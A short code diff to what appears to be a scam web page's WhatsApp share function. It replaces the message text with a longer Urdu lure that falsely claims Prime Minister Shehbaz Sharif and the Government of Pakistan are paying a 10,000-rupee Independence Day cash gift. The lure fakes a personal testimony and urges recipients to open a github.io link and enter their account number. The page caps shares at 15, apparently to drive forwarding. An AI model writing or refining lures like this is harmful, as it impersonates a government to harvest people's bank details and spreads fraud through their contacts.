@@ -253,8 +253,9 @@
     const maxShares = 15; 
 
     function shareWhatsApp() {
-        const siteLink = "https://digital-website-online.github.io/independenceday/";
-        const message = encodeURIComponent("🎉 یومِ آزادی خصوصی مالی امداد! 10,000 روپے کا ریوارڈ حاصل کرنے کے لیے اس لنک پر کلک کریں: " + siteLink);
+    const siteLink = "https://digital-website-online.github.io/independenceday/";
+    const message = encodeURIComponent("🚨 *وزیر اعظم شہباز شریف: یومِ آزادی پر 10,000 روپے کیش گفٹ* 🇵🇰\n\nحکومتِ پاکستان کی طرف سے 10,000 روپے کی فوری مالی امداد آن لائن دی جا رہی ہے۔\n\n*میں نے اپنا 10,000 کا ریوارڈ کلیم کر لیا ہے!* آپ بھی ابھی نیچے دیے گئے لنک پر جا کر اپنا اکاؤنٹ نمبر درج کریں اور کلیم کریں:\n\n👇 *ابھی یہاں کلک کریں:* 👇\n" + siteLink);
+    
         
         window.open("https://api.whatsapp.com/send?text=" + message, '_blank');
 
